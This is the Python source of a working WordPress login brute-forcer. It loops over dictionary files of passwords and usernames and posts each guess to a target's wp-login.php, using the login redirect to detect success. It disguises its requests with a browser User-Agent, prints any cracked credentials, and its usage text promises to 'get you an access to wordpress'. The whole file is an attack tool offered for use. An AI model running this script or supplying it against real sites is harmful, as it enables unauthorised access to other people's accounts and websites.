print "[+] Wordpress Password Bruteforcer by op7ic"
print "[+] contact : op7ica@gmail.com"


import urllib2, urllib
from optparse import OptionParser

def dictlist(file):
    """ Retrun dictionary as list """
    #Note: This is not the most memory-effective way .. we could have use mmap
    words = list()
    for elems in open(file,"r"):
        words.append(elems)
    return words

def getfilesize(file):
    """ Return size of a dictionary to use"""
    f = open(file,"r")
    line_numbers = sum(1 for line in f)
    f.close()
    return line_numbers

def parse_response(page):
    """ Check Error condition, if we got return to 'login' we are not in"""
    if page.geturl().endswith("wp-login.php"):
        return False
    elif ("redirect_to" in str(page.geturl()) and not page.geturl().endswith("wp-login.php")):
        return True

def setLoginSeq(options,username,password):
    """ Sent login sequence """
    login_pass = [('log',username),('pwd',password)]
    mydata=urllib.urlencode(login_pass)
    req=urllib2.Request(options.target+str("/wp-login.php"), mydata)
    
    # Make the request look human-like ;)
    req.add_header("Content-type", "application/x-www-form-urlencoded")
    req.add_header("Accept","*/*")
    #req.add_header("Accept-Encoding","deflate, gzip") # We don't want to accept gzip
    req.add_header("User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0") # we could make it random?
    # based on the redirection response we will know if its true or not
    try:
        page=urllib2.urlopen(req)
        return parse_response(page)
    except urllib2.URLError, e:
        print "Errors? Could it be lack of connection?"     
    return False

class multi_cracker():
    def setup(self,options,dict,users_dict):
        self.options = options
        self.dict = dict
        self.users_dict = users_dict
    def run(self):
        counter  = 0
        for users in self.users_dict:
            for elem in self.dict: # If password is empty
                counter += 1
                if elem == ' ':
                    response = setLoginSeq(self.options,users,' ')
                else:
                    response = setLoginSeq(self.options,users,elem)
                if response == True:
                    print "[+] Username : %s password is '%s'" %(users,str(elem).strip("\n"))
                    if self.options.verbose == True:
                        print "[!] Guess : %d " %(counter)   
                else:
                    if self.options.verbose == True:
                        print "[-] Guess: %d Username : %s failed with '%s' password" %(counter,str(users).strip("\n"),str(elem).strip("\n"))
            
        print "[+] DONE!"
    

class cracker():
    def setup(self,options,dict):
        self.options = options
        self.dict = dict
    
    def run(self):
        counter  = 0 
        for elem in self.dict:
            counter += 1
            if elem == ' ':
                response = setLoginSeq(self.options,self.options.username,' ')
            else:
                response = setLoginSeq(self.options,self.options.username,elem)
            if response == True:
                print "[+] Username : %s password is '%s'" %(self.options.username,str(elem).strip("\n"))
                if self.options.verbose == True:
                    print "[!] Guess : %d " %(counter)   
            else:
                if self.options.verbose == True:
                    print "[-] Try: %d Username : %s failed with '%s' password" %(counter,self.options.username,str(elem).strip("\n"))
            
        print "[+] DONE!"

def crack_the_box(options):
    """ Init Cracking process"""
    try:
        dictsize = getfilesize(options.password_dictionary)
        print "\t[+] Running Wordpress password attack against user: %s" %(options.username)
        print "\t[+] Passwords to crack: %d passwords" %(int(dictsize))
        print "\t[+] Target: %s" %(options.target)
        t = cracker()
        t.setup(options,dictlist(options.password_dictionary))
        t.run() 
    except Exception,e:
        print "[-] Something went wrong, reason: " ,e
     
    
def crack_the_box2(options):
    """ Init Cracking process"""
    try:
        dictsize = getfilesize(options.password_dictionary)
        dictsize_users = getfilesize(options.dictionary_usernames)
        print "\t[+] Running Wordpress password attack against : %s users" %(dictsize_users)
        print "\t[+] Passwords to crack: %d for each user" %(int(dictsize))
        print "\t[+] Target: %s" %(options.target)
        t = multi_cracker()
        t.setup(options,dictlist(options.password_dictionary),dictlist(options.dictionary_usernames))
        t.run()
    except Exception,e:
        print "[-] Something went wrong, reason: " ,e



def main():
    usage = """
    This tool will attempt to get you an access to wordpress ;)
    
    
    To crack single password for a user:
    options: -d <dict> -u <user> -t <target>
    To crack passwords for multiple users:
    options: -d <dict> -U <user dict> -t <target>
    
    
    example:
    -d /tmp/passwords.txt -U /tmp/users.txt -t http://127.0.0.1
    """
    parser = OptionParser(usage)
    parser.add_option("-d", "--dictionary", dest="password_dictionary",
                  help="Password dictionary to use", metavar="FILE")
    parser.add_option("-U", "--usernames", dest="dictionary_usernames",
                  help="Username dictionary to use", metavar="FILE")
    parser.add_option("-v", "--verbose",
                  action="store_false", dest="verbose", default=True,
                  help="Be Verbose")
    parser.add_option("-u", "--username", dest="username",
                  help="Username to check the passwords against")
    parser.add_option("-t", "--target", dest="target",
                  help="Target to assess", default=False)
    (options, args) = parser.parse_args()
    
    # If we crack only single username
    if options.username!= None and options.dictionary_usernames == None:
        crack_the_box(options)
#    # We are cracking dictionary vs dictionary
    if options.dictionary_usernames != None:
        crack_the_box2(options)
        
if __name__ == '__main__':
    main()